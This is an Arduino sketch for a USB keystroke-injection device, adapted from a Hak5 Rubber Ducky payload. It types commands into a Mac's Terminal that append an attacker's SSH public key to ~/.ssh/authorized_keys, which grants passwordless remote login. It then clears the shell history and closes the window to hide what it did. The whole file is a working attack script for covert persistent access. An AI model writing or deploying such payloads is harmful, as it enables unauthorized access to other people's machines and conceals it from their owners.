#include <Keyboard.h>

//Inserts your public SSH key as an authorized key
//https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---OSX-Passwordless-SSH-access-%28ssh-keys%29

void setup() {
  Serial.begin(9600);
  
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW) {
    Serial.print("aborting\n");
    abort();
  }

  Keyboard.begin();
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);
  
  Keyboard.print("terminal");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  delay(750);

  Keyboard.print("echo '[PUBLIC_SSH_KEY]' >> ~/.ssh/authorized_keys");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("history -c");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("clear");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();
  
  Keyboard.end();
}

void loop() {
}
